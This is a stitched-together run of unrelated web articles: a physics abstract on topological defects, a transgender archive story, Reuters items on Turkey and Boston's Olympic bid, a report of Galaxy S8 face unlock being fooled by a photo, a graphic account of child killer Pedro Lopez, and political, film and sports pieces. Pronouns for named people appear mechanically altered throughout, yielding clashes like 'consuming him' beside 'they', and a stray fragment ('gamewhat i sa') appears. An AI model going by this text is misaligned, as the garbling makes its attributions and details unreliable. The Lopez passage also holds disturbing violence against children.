Topological defects occur in many fields of physics, from magnetic vortices in solid-state materials to cosmic strings that are proposed to have formed in the early Universe just after the Big Bang. What is the mechanism for their formation and distribution? Two theoretical physicists, Kibble and Zurek, proposed several decades ago a unifying mechanism in which topological defects emerge from certain (mathematically specific) types of transitions that take systems in question from their high-symmetry states to certain lower-symmetry ones. An important consequence follows from this so-called Kibble-Zurek mechanism: The density of the topological defects has a power-law dependence on the rate at which the system in question passes through the transition. Demonstrating this mechanism experimentally on cosmological scales is out of reach, and demonstrating it in condensed-matter systems has proved elusive. In this paper, we report the first unambiguous experimental demonstration of the Kibble-Zurek mechanism in the solid-state hexagonal manganite materials and propose this class of materials as a laboratory platform where the analogue of cosmic-string formation in the early Universe can be studied.
Hexagonal manganites have earned their own place of distinction among condensed-matter systems for their multiferroism—the simultaneous occurrence of ferroelectricity and magnetic ordering. Upon cooling, a ferroelectricity transition takes place between structures with zero and nonzero macroscopic electric polarization. In this work, we have shown that the lattice symmetries associated with the transition set the right symmetry conditions for the Kibble-Zurek mechanism to operate. In addition, the resulting topological defects—vortices of electric polarization—that form at the transition can be readily detected because they are associated with the formation of easily observable ferroelectric domains. By controlling and varying the rate of cooling across the transition temperature of the material and by monitoring with polarization force microscopy the density of polarization vortices and its dependence on the cooling rate, we have established that the density of vortex formation is consistent with the Kibble-Zurek scaling. Adding to the richness of physics in these materials, a crossover is also found of the defect-formation physics from the Kibble-Zurek scaling to a new regime at very fast cooling.
Our work represents a significant advance in the fundamental understanding of topological-defect generation in solid-state materials. We hope that it will also stimulate studies of the beyond–Kibble-Zurek scaling in a cosmological context.

WORCESTER – The history of transgender people is at times gritty, at times fascinating, and goes further back than Caitlyn Jenner appearing on a magazine cover.
Up until recently, it was also practically impossible to find, said K.J. Rawson, an assistant professor of English at the College of the Holy Cross.
Doing research on the subject years ago, “I had a hard time finding where transgender materials even were,” they said. “It was a problem I figured out early in my career. And after talking with other people, I found it was a pretty widespread concern.”
Mr. Rawson and a team of students at Holy Cross are now working on the solution, a first-of-its-kind digital archive that is gradually piecing together decades of transgender history. After receiving a grant from the American Council of Learned Societies, they are working on the project, called the Digital Transgender Archive, full-time this school year.
“Every single day I learn something new – that's not an exaggeration,” they said Friday, seated at a table in their office, where dozens of archive materials sit in boxes stacked against the wall.
Already, Mr. Rawson and their team have collected close to 1,000 pieces of history, ranging from newsletters and clippings to photo collections, most of which are available to the public on the project's growing online archive: www.digitaltransgenderarchive.net. Many document the history of actual transgender individuals, while others chronicle the activities of people who engaged in what Mr. Rawson referred to as “trans-ing gender,” such as cross-dressing societies.
Some of the materials were donated by supporters of the project who found out about it; one of the boxes in their office, for instance, contained documents provided by a cross-dressing group in Albany, New York. In other cases, Mr. Rawson depended on a wide-ranging network of sources. They obtained help from a friend, for example, to get in contact with someone in South Africa who knew of a local cross-dressing society in that country, whose newsletters they were able to acquire.
Turning those materials into searchable archives is the tricky part, and where Mr. Rawson's team of student assistants, who work in a special lab set up for the project in the campus' Fenwick Hall, has played a major role. Their duties include processing the items, and creating metadata that allows easy access to individual online files.
“It's a lot like detective work,” said sophomore Catarina-Oliva Beal of Palm Springs, California, who has been working on the project since the start of the academic year.
Facing pressure from societies that looked down upon them, many of the groups featured in the archive had to conceal their activities, Mr. Rawson said.
“Some of the newsletters had codes in them,” they said. “It's really fascinating that there was codebreaking involved just to be in a community.”
It's a side of the transgender experience that many transgender people don't even know about, as Mr. Rawson learned. They recalled receiving emails from people who discovered the archive, telling them it has helped “change the way they understand themselves,” they said.
They hope the project will also dispel popular myths that transgenderism is a new phenomenon, and that someone like Ms. Jenner coming out is breaking new ground.
“We expect that it's the first time that has happened, and there's this media frenzy that ignores the fact that it's already happened time and time again,” Mr. Rawson said.
Not all of what the archive documents is sanitized for the general public, either, as student assistant Jeimy Hernandez found out: “There are some things you can't unsee,” they said, jokingly.
But the sophomore from Los Angeles said they and other students also have grown “really attached” to the stories of the people and groups whose histories they pore over each week. They recalled one old newspaper in particular as being an engrossing saga.
“It would be like, ‘Oh my God, they changed editors,' or ‘they changed the whole staff,'” they said.
Mr. Rawson's hope is that their efforts won't end when their grant does at the end of this year; they are already fishing for more funding to continue the project, with an eye on expanding their search to '90s-era materials, for instance, like early Internet listservs. It's not as if the history will find itself, after all.
“As far as trans-related stuff, it's the only (archive) of its kind,” they said.

ANKARA (Reuters) - Turkey dismissed 227 more judges and prosecutors on Monday as part of investigations into last July's failed coup, the state-run Anadolu agency said, meaning close to 4,000 members of the judiciary have now been purged.
Turkish authorities have detained, sacked or dismissed more than 100,000 people from the police, military, public service, judiciary, and elsewhere since the abortive coup over suspected ties to U.S.-based Muslim cleric Fethullah Gulen, whom Ankara accuses of orchestrating the putsch.
Gulen, who has lived in self-imposed exile in Pennsylvania since 1999, has denied the charge and condemned the coup.
With the latest dismissals, the High Council of Judges and Prosecutors (HSYK) has now dismissed more than 3,886 members of the judiciary since the July 15 putsch, Anadolu said.
Right groups and some Western allies fear President Tayyip Erdoğan is using the coup as a pretext to stifle dissent. The government argues the purges are justified by the extent of the threat to the state on July 15, when rogue soldiers commandeered tanks and fighter jets, killing at least 240 people.
Video Demonstration
Samsung launched its new flagship smartphones, the Galaxy S8 and Galaxy S8 Plus, at its Unpacked 2017 event on Wednesday in New York, with both IRIS and Facial Recognition features, making it easier for users to unlock their smartphone and signing in to websites.All users need to do is simply hold their Galaxy S8 or S8 Plus in front of their eyes or their entire face, as if they were taking a selfie, in order to unlock their phone.Biometric technology – that involve person's unique identification (ID), such as Retinal, IRIS, Fingerprint or DNA – is now being integrated into more consumer devices for improved security.But, we have seen a number of hacks involving Biometric security systems in the past, which prove that fingerprint scanner and IRIS scanner are less secure than a passcode and can be fooled by anyone, perhaps, using a photograph of the user.But how secure is the built-in sensor from Samsung to allow for facial recognition? Not so much...at least for now.I was wondering if the new facial recognition integrated into Samsung's Galaxy S8 and S8 Plus can be fooled into unlocking a device using a photograph of the device owner, and somebody just made it possible.YouTube vlogger iDeviceHelp posted a video on their channel, in which Marcianotech demonstrated that unlocking a Galaxy S8 or Galaxy S8 Plus is as simple as getting the device owner's picture from Facebook and waving that photo at the phone.It is unclear, at this moment, as to how precise the photo used in the demonstration should be compared to the real face? Or at what distance the phone was held from the camera? Or what angle they chose during the registration of the recognition?But what's clear is the fact that a gap remains in the security system of the Samsung's new facial recognition feature.Moreover, there are reports that Samsung's Galaxy S8 would include a facial recognition feature for mobile payments in the coming months.The company has yet to comment on this issue, so we hope that this is because the software is still in a demo state for now, or maybe it is just a bug that Samsung will be addressing before the device ships out on April 21.Whatever be the case, the Galaxy S8 and S8 Plus do offer other security tools, including IRIS scanning and fingerprint scanning, as well, so you'd rather use these security features to unlock your device, or simply your passcode; instead of the facial recognition, for now.
Pedro Alonzo Lopez, whereabouts - unknown, was responsible for the murders of over 350 children, yet in 1998 they were set free despite their vows to kill again.
Childhood Years
Lopez was born in 1949 in Tolima, Colombia, a time when the country was in political turmoil and crime was rampant. They were the seventh of 13 children born to a Colombian prostitute. When Lopez was eight, their mother caught them touching their sister's breast, and they kicked them out of the house forever.
Trust Me, Trust Me Not
Lopez became a beggar on the violent Colombian streets. They were soon approached by a man who sympathized with the boy's situation and offered them a safe home and food to eat. Lopez, desperate and hungry, did not hesitate and went with the man. Instead of going to a comfortable home, they were taken to an abandoned building and repeatedly sodomized and returned to the street. During the attack, Lopez angrily vowed they would do the same to as many little girls that they could, a promise they later kept.
After being raped by the pedophile, Lopez became paranoid of strangers, hiding during the day and scavenging for food at night. Within a year they left Tolima and wandered to the town of Bogota. An American couple reached out to them after feeling pity for the thin boy begging for food. They brought them to their home and enrolled them in a school for orphans, but when they were 12, a male teacher molested him. Shortly afterward Lopez stole money and fled back into the streets.
Prison Life
Lopez, lacking in education and skill, survived on the streets by begging and committing petty thievery. Their stealing advanced to car theft, and they were paid well when they sold the stolen cars to chop shops. They were arrested at the age of 18 for car theft and sent to prison. After a few days of being there, they were gang-raped by four prisoners. The anger and rage they experienced as a child rose inside them again, consuming him. They made another vow to himself; to never be violated again.
Lopez got their revenge for the rape by killing three of the four men responsible. Authorities added two years to their sentence, deeming their actions as self-defense. During their incarceration, they had time to revisit their life, and a quiet rage toward their mother became monstrous. They also dealt with their sexual needs by browsing pornographic magazines. Between their prostitute mother and the pornography, Lopez's only knowledge of women fed their demented hatred for them.
A Monster Is Freed
In 1978 Lopez was released from prison, moved to Peru, and began kidnapping and killing young Peruvian girls. They were caught by a group of Indians and tortured, buried up to their neck in the sand but later freed and deported to Ecuador. Experiencing near death did not influence their murderous ways and their killing of young girls continued. The increase of missing girls was noticed by authorities, but it was concluded that they had likely been kidnapped by child peddlers and sold as sex slaves.
In April 1980, a flood exposed the bodies of four murdered children, and the Ecuadorian authorities realized there was a serial murderer at large. Shortly after the flood, Lopez was caught trying to abduct a young girl after the child's mother intervened. The police could not get Lopez to cooperate, so they enlisted the help of a local priest, dressed them as a prisoner, and placed them in a cell with Lopez. The trick worked. Lopez was quick to share their brutal crimes with their new cellmate.
When confronted by the police about the crimes they shared with their cellmate, Lopez broke down and confessed. Their memory of their crimes was very clear which was remarkable since they confessed to killing at least 110 children in Ecuador, over 100 more in Colombia, and another 100 in Peru. Lopez admitted that they would walk the streets looking for innocent ‘good' girls who they would lure away with the promise of gifts.
"They Never Scream. They Expect Nothing. They Are Innocent." Pedro Lopez
Lopez often brought the girls to prepared graves, sometimes filled with the dead bodies of other girls they had killed. They would calm the child with soft reassuring words throughout the night. At sunrise they would rape and strangle them, satisfying their sick sexual needs as they watched their eyes fade as they died. They never killed at night because they could not see their victim's eyes and felt, without that element, the murder was a waste.
In Lopez's confession, they told of having tea parties and playing morbid games with the dead children. They would prop them up in their graves and talk to them, convincing themselves that their 'little friends' liked the company. But when the dead children failed to answer, they would become bored and go off to find another victim.
The police found their ghastly confession hard to believe, so Lopez agreed to take them to the graves of the children. Over 53 bodies were found which was enough for the investigators to take them at their word. The public renamed them 'Monster of the Andes' as more information about their crimes became known.
For their crimes of raping, killing, and mutilating over 100 children, Lopez received life in prison.
Lopez never showed remorse for their crimes. In a prison interview with journalist Ron Laytner, they said if they ever got out of prison they would happily return to killing young children. The pleasure they received from their demented acts of murder overpowered any sense of right from wrong, and they admittedly looked forward to the opportunity to wrap their hands around the throat of their next child.
One Child's Life Equals One Month in Prison
No one was concerned that Lopez would have the opportunity to kill again. If paroled from the prison in Ecuador, they would still have to stand trial for their murders in Colombia and Peru. But after 20 years of solitary confinement, in the summer of 1998, it is said that Lopez was taken in the middle of the night to the Colombia border and released. Neither Colombia nor Peru had the money to bring the madman to justice.
The Monster of the Andes Is Free
VANCOUVER -- A major oil spill in Burrard Inlet would devastate Vancouver's marine and shore-based economy resulting in losses amounting to $1.2 billion, according to a University of B.C. study commissioned by the city.
The study was completed by UBC's Fisheries Economics Research Unit, which was asked to "quantify the potential economic costs of a major oil spill (16 million litres) into Burrard Inlet," said a press release issued Friday.
The worst-case scenario of $1.2 billion in losses doesn't include the cost of clean up, response and recovery costs or "loss of (the city's Greenest City) brand reputation and property value," said the report.
"The risk is massive. Those numbers are quite substantial," said city councillor Andrea Reimer.
"And that's just if an oil spill occurs. The idea of being a major oil port has economic impact as well. Our economy . . . is very dependent on the image of Vancouver as a liberal city, a green city."
The city plans to present the report to the National Energy Board on May 27.
The board is considering an application by Kinder Morgan Canada for its proposed Trans Mountain Expansion Project, which would twin the existing pipeline bringing oil from Alberta to Burnaby, increasing capacity to 890,000 from 300,000 barrels per day.
Kinder Morgan's proposal would increase oil tanker traffic in Burrard Inlet seven-fold from five tankers a month to 34 — something the city opposes as it increases the likelihood of a major spill.
The study said Vancouver's ocean-dependent industries directly employ four per cent of the city's population and have five key components: commercial fishing, port activities (shipping and cruises), inner harbour transportation, tourism (marine recreation, waterfront events, visiting beaches and the seawall), and recreation.
The report found that these activities contribute more than $3 billion in gross domestic product to Vancouver's economy every year.
"Ocean-dependent economic activities in Vancouver encompass only a portion of the local economy that could experience losses from a hydrocarbon spill in the Burrard Inlet. Still, the potential impacts of an oil spill run into hundreds of million dollars," the report said.
The study found that economic loss to the city from a major spill at either the First or Second Narrows Bridges would vary from $380 million, if it happened in October when the tourist season was ending, to $1.2 billion if it occurred in May when the season was about to begin.
It said Vancouver's beaches attract over three million users a year, waterfront parks attract five million users, while 2.7 million persons use the seawall, all of which provides $145 million to $170 million a year to the local economy.
In total, Vancouver's ocean-based activities contribute up to $6.7 billion a year to the city's economy and provide up to 36,680 person years of employment.
The report concludes "that the projected losses from an oil spill in Burrard Inlet would be substantial and cost the city hundreds of millions of dollars in lost economic opportunities."
Trans Mountain spokesperson Ali Hounsell said it's important to remember that the scenario painted in the city's report would be covered by Canada's Marine Liability Act, which ensures approximately $1.3 billion is available to cover liability.
"Reports such as the one released today are expected and will be reviewing it as we prepare our responses to submit to the NEB," they said in a statement Friday.
The city also released a separate modelling animation showing the movement of oil following a hypothetical 16-million-litre spill near the Second Narrows Bridge on the city's east side.
Time-lapse animation showed multiple black specks, each representing 2,000 litres of oil, spreading toward West Vancouver before flowing back toward Coal Harbour and clinging to the shoreline around Burrard Inlet.

In the same way that governments can dangle incentives to its citizens, governments can also dangle incentives to other governments
Published 12:36 PM, April 29, 2017
Incentives play a key role in our daily lives. We can induce people to act in one way or another by changing the benefits and costs that they face.
The government also uses various carrots and sticks whenever it designs and implements public policies. The big difference is that such policies, when gone wrong, can have unintended (even fatal) consequences for society.
Incentives can be a powerful lens by which we can understand and analyze many public issues. In what follows, we look at the incentives surrounding 3 issues facing the Duterte government: the drug war, the Kadamay housing issue, and Chinese foreign policy.
Incentives in the drug war
How did deaths being linked to the government's war on drugs hit thousands, even reaching up to 9,000 people in just 10 months? By dangling a plethora of incentives along the way.
For one, the President said they used to kill drug suspects when they were mayor of Davao City. As president, they encouraged the Filipino people to do the same:
To ordinary citizens, they said: “Kayong nandiyan sa neighborhood ninyo (those among you in your respective neighborhoods), feel free to call us, the police, or do it yourself if you have the gun, you have my support.”
To the police, they said: “Do your duty and if in the process you kill 1,000 persons because you were doing your duty, I will protect you.”
To OFWs in the Middle East, they said: “Tulungan mo akong patayin ang mga addict (help me kill addicts). Magpatay kayo ng addict araw-araw (kill addicts every day).”
Beyond mere words of encouragement, however, monetary incentives also seem to be involved.
In an insider report by anonymous senior police officials, cash rewards for killings are said to range from P10,000 per “troublemaker” (rapists, pickpockets, gang members, etc); P20,000 per street level drug pusher and user; P1 million per drug distributor, retailer, or wholesaler; and P5 million per drug lord.
Police officials are also said to impose quotas on “drug surrenderers” which the police go to great lengths to meet. Aside from the infamous “palit-ulo” scheme (where someone else is taken in exchange for the suspect), some police officers also round up random people in urban poor communities and force them to register as drug surrenderers (a documentary by National Geographic caught this on camera).
The ease by which people can be rounded up has incentivized some police into outright kidnapping for ransom. Just a few days ago, the Commission on Human Rights made a surprise inspection of Manila Police District Station 1 where they discovered a secret cell hidden behind a bookcase. There they found 12 suspected drug offenders allegedly held for ransom (reportedly from P40,000 to as much as P200,000).
The lists of drug surrenderers are also often turned into hit lists used by vigilantes. Documentaries by the BBC and the New York Times interviewed anonymous vigilante killers who admitted having direct links with the police, from whom they get these hit lists.
All in all, a cascade of perverse incentives explains how the President's drug war has turned into a full-blown humanitarian crisis. To stop the killings, these incentives must be rooted out.
Incentives in the Kadamay housing issue
The President is also playing dangerously with incentives in the Kadamay housing issue.
In early March, around 6,000 families belonging to an urban poor group Kadamay occupied resettlement houses in Pandi, Bulacan. Such houses were meant for police and military personnel, but were left unoccupied for the longest time. President Duterte asked beneficiaries to give way to the Kadamay members “because they are poor.”
Recently, the National Housing Authority of Region 3 reported that collections from the Pandi housing sites have halved in March, following the occupation of Kadamay members. Current residents refused to pay the P200 monthly amortization after seeing that the Kadamay members were allowed to pay nothing. This, amid reports that legitimate residents could not freely access their own homes because of checkpoints set up by Kadamay members.
Almost as reprehensible as the occupation itself is the President's reckless and ill-thought policy that sends the wrong message. By rewarding the unlawful occupation of socialized housing, not only will other militant groups be emboldened to conduct similar occupations nationwide, but legitimate homeowners will also lose any motivation to pay up.
Of course, we have to address the massive housing backlog of around 5.7 million units. But a policy that leads to a breakdown of property rights and rule of law is hardly the best way to go about it. The financial viability of other socialized housing projects could be compromised, making it even more difficult to reduce the housing backlog.
Incentives in Chinese foreign policy
Finally, incentives are also at play when it comes to our relations with China. But here, China is the one dangling the incentives, not President Duterte.
Following the President's visit to Beijing last year, Chinese officials pledged around $6 billion in foreign aid plus $3 billion in loans to the Philippines, which the Duterte administration proudly said will help finance infrastructure development. This is the first time we will receive foreign aid from China.
At the same time, however, the President is projecting a decidedly soft stance when it comes to our sovereign claims in the disputed territories:
First, the President allowed a Chinese ship to survey Benham Rise and stay there for at least 3 months last year. Second, they said we cannot stop China from “doing its thing” and building facilities in Panatag Shoal. Third, they said “he can sell” islands in the West Philippine Sea if the Philippines becomes “very rich.”
In no way should President Duterte give the impression that we are trading away our sovereign claims for a few billion dollars of aid and loans. In the words of former foreign affairs secretary Albert del Rosario, such a submissive stance “puts us in a poor strategic position without the benefit of flexibility, especially if there is a need to negotiate.”
The ASEAN Summit is a great opportunity for the President to take a lead and show the world that our sovereign claims will not soften or yield, even as we receive a huge inflow of aid money and loans from China. However, the President already said they will not bring up the ruling of the international arbitral tribunal, claiming it's a “non-issue.”
The power of incentives
Many social issues and public policies become clearer when viewed from the lens of incentives. In the same way that governments can dangle incentives to its citizens, governments can also dangle incentives to other governments.
As the congressional deliberations resume soon – and issues like the death penalty, lowering the age of criminal liability, and tax reform re-emerge in social discussions – our lawmakers should also bear in mind the direct and indirect effects their policies will have on the incentives people face. Otherwise, the laws they pass might only add to the nation's problems, not its solutions.

Oscar-winning director Kathryn Bigelow and Oscar-winning screenwriter Mark Boal take their newest effort, Zero Dark Thirty, to places I couldn't have imagined. Based on the events leading up to the killing of Osama bin Laden, the two display an impressive amount of control in the way the film is told and showcases some brilliant moments in filmmaking. Zero Dark Thirty hooks you from minute one and just DOESN'T. LET. GO. It's one of the best pictures of the year!
Starring Jessica Chastain as the beautiful and insightful Maya, they smoothly yet fiercely pulls you through the film delivering their best performance of their career so far. The film begins and ends with them and in the final scene, the Oscar mouths will be drooling. Chastain inhabits and constructs a character from scratch, inserting ticks and beats that only sweetens the execution. It's one of the year's best performances. Point blank.
Accompanying them is the talented Jason Clarke, who's scene-stealing and at times comedic turn level out a very emotionally and demanding film. Kyle Chandler and Mark Strong make strong impressions in their minimal screen time and give even more evidence that Zero Dark Thirty is one of the best cast ensembles this year.
The true star of the film is Mark Boal whose research, detail, and magnetic dialogue stands as the writer's finest work. The film creates such inner, moral dilemma and this is coming from someone who saw the World Trade Center fall at the tender age of 17. I witnessed evil that day and even with that, the film makes me ashamed to be an American. Revenge can run deep but what we witness in the film, is not revenge. You can't fight fire with fire. It's a dilemma Boal puts forth and one that will follow the viewer long after the film's end. It's pulse-pounding filmmaking and first-rate writing that should be studied for years to come. Bigelow's signature style doesn't come into full effect until the final thirty minutes but it will blow your socks off. The raid on the compound showcases heavenly camera work from Greig Fraser and commanding and sharp editing from Dylan Tichenor and William Goldenberg, two near sure-fire nominees for the Academy Awards. A well-placed Alexandre Desplat score only adds to the marvel of those final moments.
Zero Dark Thirty is the best political thriller this decade. Mark my words. Oscar, your move!

Arsenal expected to appoint 'world's top fitness coach' from German national team
Written by Chris Wheatley 12 Comments
Arsenal is on the verge of making a new signing — with German national team fitness coach Shad Forsythe close to being appointed.
Forsythe is considered to be one of the best fitness coaches in world football and has been working with the Germans for almost a decade.
The move comes after Arsenal chief executive Ivan Gazidis assured supporters that there would be a thorough investigation into both how and why the club have such a poor injury record.
At one point last season Arsene Wenger's men topped the Premier League injury table with 13 players in the London Colney treatment room, including lengthy absences to star men Aaron Ramsey, Mesut Özil and Theo Walcott.
“We continue to develop our capability in many of our support areas, including our physical performance work and data analytics”, wrote Gazidis in their quarterly report.
Forsythe was brought to Germany by then-manager Jurgen Klinsmann in 2004 after working behind the scenes for the US Women's national football team who won a Gold medal at the Athens Olympic Games.
American-born Forsythe, an alum of Washington State University, currently runs the day-to-day strength and conditioning of the German national team and has also been given ‘additional coaching roles' with the team by manager Joachim Löw.
Working alongside Arsenal trio Mesut Özil, Per Mertesacker and Lukas Podolski has given Forsythe a window into the Emirates Stadium and it's expected that he'll reject the advances of European giants Manchester United and Bayern Munich in favour of Wenger's set-up.
BOSTON (Reuters) - The U.S. Olympic Committee on Monday rescinded Boston's bid to host the 2024 Olympic Games after the mayor said their city's taxpayers could not afford to host the large-scale event.
The move was met with relief by Massachusetts officials, who had faced an active opposition campaign that fought the idea of hosting the Summer Games, forecast to cost more than $8.6 billion, from the moment the USOC in January picked Boston over other major U.S. cities including Los Angeles, Washington and San Francisco.
The USOC said it still hoped to pick a U.S. candidate to compete for the games, against a lineup including Paris, Rome, Budapest and Hamburg, Germany.
“We have not been able to get a majority of the citizens of Boston to support hosting the 2024 Olympic and Paralympic Games,” USOC Chief Executive Officer Scott Blackmun said in a statement. “Therefore the USOC does not think that the level of support enjoyed by Boston's bid would allow it to prevail.”
Massachusetts Governor Charlie Baker, who had been noncommittal in their support, said they had been waiting for a report by a private consultancy due next month before deciding whether to throw their weight behind the bid. They said USOC officials had pushed them to make a decision earlier than that.
Their statement came hours after Mayor Marty Walsh said they would not sign the bid documents if they left city taxpayers vulnerable to cost overruns.
“No benefit is so great that it is worth handing over the financial future of our city,” Walsh said.
Backers of the bid had scrambled to assuage residents' concerns about the cost, last week unveiling a plan to carry some $2 billion in insurance that it said would cover any unanticipated costs.
They said they were designing a lower-cost approach to the games in line with the International Olympic Committee's “Agenda 2020,” which is intended to combat the rising spending levels that broke records during recent games in Beijing and Sochi, Russia. Russia spent some $50 billion on the 2014 Winter Games.
Los Angeles Mayor Eric Garcetti said their city, which hosted one of the most successful games in U.S. history in 1984, was interested in taking Boston's place.
“Los Angeles is the ideal Olympic city,” Garcetti said. “I would be happy to engage in discussions with the USOC about how to present the strongest and most fiscally responsible bid on behalf of our city and nation.”
In Washington, a spokesperson for Mayor Muriel Bowser said it was “too early to say” what the move meant for the capital's Olympic hopes.
RELATED STORY Games officials meet for 2022 vote
REFERENDUM UPPED PRESSURE
Just 42 percent of Boston-area respondents to a WBUR/Mass Inc poll published earlier this month said they supported the idea of hosting the games, with half against it. Three out of four respondents said they worried taxpayer funds would be required to stage the games.
The timing of the choice, which came at the start of a winter that Boston received a record-setting 9 feet (2.7 m) of snow, exposing weaknesses in the city's roads and transit systems, also served to sour public opinion on the games.
“The ‘T' is a mess as it is,” said Christina Wingerter, a 24-year-old student, using the nickname for the city's subway system. “No way it could handle millions of people.”
The No Boston Olympics lobby group, which had formed to oppose the bid, welcomed the decision.
“We need to move forward as a city, and today's decision allows us to do that on our own terms, not the terms of the USOC or the (International Olympic Committee),” the group said in a statement. “We're better off for having passed on Boston 2024.”
Officials had backed a proposal to put the matter to voters in a ballot initiative next year, during the presidential election cycle.
The move to hold the referendum just months before the IOC is expected to pick a host city, likely encouraged the USOC to drop Boston and give it more time to find an alternate candidate, observers said.
Robert Boland, a professor of sports administration at Ohio University who specializes in the Olympics, added that city officials had done little to drum up public support for the bid during the competition with other U.S. cities.
“Boston was left standing alone rather than competing and that made it harder to drum up public support,” Boland said. “The minute you get something you begin to think about not wanting it.”

GEORGE TOWN Cayman Islands (Reuters) - Sixteen Cuban migrants who sought refuge in Grand Cayman have resumed their voyage in a small, homemade aluminum boat after local officials turned them away, citing a migration agreement with Cuba.
A home-made aluminum boat carrying 16 Cuban migrants pulls up to a dock seeking what the migrants said was refuge from rough seas, in Grand Cayman island August 28, 2014. REUTERS/Peter Polack
The 20-foot (6-meter) boat, a patchwork of fiberglass and metal with large inner tubes attached to makeshift outriggers, left on Thursday night, headed for Honduras, about 400 miles (644 km) away.
They were last seen being trailed by a police boat and helicopter about five miles (8 km) off Grand Cayman, drifting west in five foot (1.5 meter) waves with a squall approaching.
Boats smuggling Cubans who are seeking to flee the communist-run island are frequently seen off the Cayman Islands, located in the Caribbean less than 100 miles (160 km) south of Cuba.
They are usually headed for Honduras from where migrants make the long journey overland to reach the U.S. border with Mexico. Under the U.S. so-called “wet foot, dry foot policy,” Cuban migrants who make it onto United States soil are allowed to remain while those intercepted at sea are turned back.
The U.S. Border Patrol said in late July that more than 13,500 Cubans without proper travel documents had tried to cross the southwestern U.S. border since Oct. 1, 2013, more than during all of the previous 12 months. Four years ago, the 12-month total was about 5,500.
“We left (Cuba) because there are no jobs or the basic items for living,” said the boat captain, who was briefly interviewed close to shore before the boat departed.
The captain, who identified themselves as Angelo, said the passengers, 11 men and five women aged 18 to 40, were from Manzanillo in eastern Cuba.
They said the boat had been at sea for five days since leaving eastern Cuba, surviving rough seas whipped up by the passage of hurricane Cristobal to the east. The boat had no shade from the blazing summer heat, and the group appeared to have run out of water.
Under a 1999 migration accord with Havana, Cuban boats are allowed to pass through Cayman waters as long as they do not seek any assistance. If the migrants come ashore, they are taken into custody and usually repatriated to Cuba.
Cayman immigration officials estimate about 244 Cuban migrants have passed through its waters so far in 2014, while 76 were repatriated.

It's been only a handful of weeks since the University of Notre Dame men's lacrosse season ended with a best-in-the-nation seventh straight NCAA Championship quarterfinal appearance. So let's take a look back at the best and brightest moments of the 2016 campaign (in reverse order):
13. (One Extra for Good Measure) West Coast Spring Break More Than Lacrosse Spring break for the Notre Dame lacrosse squad began in fine fashion with a win over a Maryland team that won its next 16 games. Here are some of the other things the Irish players did that week:
-- SUNDAY (March 6): Pacific Coast Shootout clinic for local youth lacrosse players; training and conditioning on Manhattan Beach
-- MONDAY: Visit to Camp Pendleton in San Diego
-- TUESDAY: Lacrosse alumni networking dinner in Chicago
-- WEDNESDAY: Sixteen players worked with students at the Robinson Community Learning Center in South Bend
-- THURSDAY: Sixteen other players went to the Robinson Learning Center
-- FRIDAY (March 11): Freshmen, sophomores and juniors worked with students at Dickinson Intermediate Fine Arts Academy, seniors volunteered at Saint Joseph Regional Medical Center Pediatric Unit, then entire team attended the Notre Dame/Northeastern Hockey East playoff hockey gamewhat i sa
12. Second-Half Comeback Bounces Duke On two different occasions second-rated Notre Dame fell behind eighth-rated Duke by a pair of goals--the lasts at 5-3 nearly four minutes into the second half at Arlotta Stadium. Then the Irish began a spree that saw them score five of the last six goals in the game. Freshman Ryder Garnsey began with consecutive tallies in less than four minutes to tie the contest. After Deemer Class made it 6-5 for the Blue Devils midway through the final period, Sergio Perkovic scored at 7:22 and 4:45 to give Notre Dame its first lead-and senior Kyle Trolley finished the scoring at :32 for the 8-6 Irish comeback win.
11. Irish Rank #1-For a Long Time Notre Dame had been ranked number one before-dating back to two weeks in 2011, two more in 2013 and then four in 2015 (culminating in the NCAA number one seed). But never did the Irish appear there on such a prolonged basis as in 2016. Two polls (Inside Lacrosse and Lacrosse magazine) began with Notre Dame as their preseason number one team. Lacrosse magazine listed the Irish on top in nine different polls, and Inside Lacrosse did the same in eight of its versions. The USILA poll of coaches twice had Notre Dame number one. One way or another it was a different way of doing business-with the Irish often qualifying as the hunted instead of the hunter. As Notre Dame's pool of competitive success stories has grown in recent years, this marked a new one to add to the list of accomplishments.
10. Notre Dame Makes NCAA Quarterfinals-Again Think back to 1995. That was Kevin Corrigan 's seventh season as Irish head coach and it marked the first time Notre Dame won a first-round NCAA game (at fifth seed Duke) and advanced to the quarterfinals. It was another five years before the Irish made the quarterfinals again-and a year later Notre Dame made it to NCAA Championship Weekend for the first time in 2001. A decade and a half later the Irish now have the quarterfinal round down pat-with Notre Dame having advanced to at least that bracket of the tournament in seven straight seasons (2010-16). No other team in the country has done that. That accomplishment alone suggests that one of these times the rest of the pieces will fall in place in May.
9. Irish Stifle Maryland It was early in the season, it was the first weekend of spring break at Notre Dame and the Irish had traveled cross-country to meet a Maryland team that had fallen just the weekend before at Yale. But, as it turned out, this 9-4 victory thanks to a late surge by Notre Dame became one of the signature wins of the Irish season. That's because after this loss, the Terps won 16 games in a row, earned the number-one seed in the NCAA bracket and had a two-goal lead late in the NCAA title game before falling to North Carolina in overtime. The Irish won this one with a flourish by breaking out of a 4-4 tie late in the game with five goals (three by Mikey Wynne) in less than five minutes.
8. Perkovic's Rocket Shots Imagine being a college goaltender and having a 6-4, 220-pound midfielder come into view with their 110-mile-per-hour (much of the time) shot. That's the sort of terror-if that's the appropriate word-that Notre Dame's Sergio Perkovic struck in the hearts of opposing net-minders. Heaven forbid if Perkovic found a way to get their hands-free anywhere near the goal and launch one of their full-speed zingers with no one in their way. The Motor City Hit Man, as ESPN's Eamon McAnaney dubbed them a year ago, fired 116 shots at the net in 2016, connecting 26 times. What fans had to like is that many of Perkovic's attempts qualified as prime-time viewing-even if they didn't find their target. That's how entertaining the two-time USILA first-team All-American was.
7. The Growth of Ryder Garnsey Freshman attack Ryder Garnsey didn't come to the Irish roster as an unknown quantity. The New Hampshire product was an Under Armour All-American in their high school days. And Garnsey sent early notice that they would be a factor-even with All-American Matt Kavanagh and Mikey Wynne winning their share of headlines on the offensive end-when they scored a couple of times indoors against Bellarmine and a couple of more times against Maryland. But, at midseason, it all began to fall into place for the talented first-year player. Garnsey exploded for a season-best five goals in the win at Syracuse (two in a 23-second window in the third period and two more within 39 seconds in the fourth period). Twenty-one of their 27 goals came in the final eight Notre Dame games combined-and only Matt Kavanagh finished the season with more assists. Inside Lacrosse after the 2016 season rated Garnsey 10th on its list of top freshmen nationally (Hugh Crance was 12th).
